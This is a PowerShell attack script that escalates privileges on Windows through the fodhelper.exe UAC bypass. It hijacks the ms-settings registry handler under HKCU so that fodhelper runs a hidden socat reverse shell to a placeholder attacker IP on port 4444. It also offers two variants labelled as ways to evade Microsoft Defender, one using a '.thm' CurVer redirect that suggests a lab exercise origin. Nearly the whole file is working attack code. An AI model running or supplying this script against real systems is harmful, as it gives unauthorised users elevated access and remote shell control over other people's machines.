# PowerShell Script for Registry Manipulation and Privilege Escalation Checks
# Requires: PowerShell 5.0+
# Author: DeMzDaRulez

# PS version check
if ($PSVersionTable.PSVersion.Major -lt 5) {
    Write-Host "This script requires PowerShell 5.0 or higher. Exiting."
    exit 1
}

# Enforce a minimum PowerShell version
#Requires -Version 5.0

# Function to check privilege level
function Check-Privilege {
    $whoamiOutput = whoami /groups
    $mandatoryLabel = $whoamiOutput -match "Mandatory Label"
    return $mandatoryLabel
}

# Function to modify registry
function Set-Registry ($path, $cmd) {
    New-Item $path -Force
    New-ItemProperty -Path $path -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path $path -Name "(default)" -Value $cmd -Force
}

# Function for cleanup
function Cleanup ($path) {
    Remove-Item $path -Force -Recurse
}

# Declare variables
$attackerIP = "<attacker_ip>"
$registryPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
$reverseShellCmd = "powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:$attackerIP:4444 EXEC:cmd.exe,pipes"
$defenderBypass1Cmd = "$reverseShellCmd & reg query $registryPath"
$defenderBypass2Path = "HKCU:\Software\Classes\.thm\Shell\Open\command"
$defenderBypass2Cmd = $reverseShellCmd

# Check privilege level
$mandatoryLabel = Check-Privilege
if ($mandatoryLabel -match "System") {
    Write-Host "You are System! Exiting."
    exit 1
} elseif ($mandatoryLabel -match "High") {
    $response = Read-Host "Are you aiming for System? (y/n)"
    if ($response -eq 'n') {
        Write-Host "Not aiming for System. Exiting."
        exit 1
    }
}

# Select attack technique
$technique = Read-Host "Select technique (1: Reverse Shell, 2: Defender Bypass 1, 3: Defender Bypass 2)"
switch ($technique) {
    "1" {
        Set-Registry $registryPath $reverseShellCmd
        Start-Process "fodhelper.exe"
    }
    "2" {
        Set-Registry $registryPath $defenderBypass1Cmd
        Start-Process "fodhelper.exe"
    }
    "3" {
        Set-Registry $defenderBypass2Path $defenderBypass2Cmd
        Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force
        Start-Process "fodhelper.exe"
    }
}

# Recheck privilege level
$mandatoryLabel = Check-Privilege
if (-Not ($mandatoryLabel -match "System") -And -Not ($mandatoryLabel -match "High")) {
    Write-Host "Privilege escalation failed. Running cleanup."
    Cleanup $registryPath
    Cleanup $defenderBypass2Path
    exit 1
}
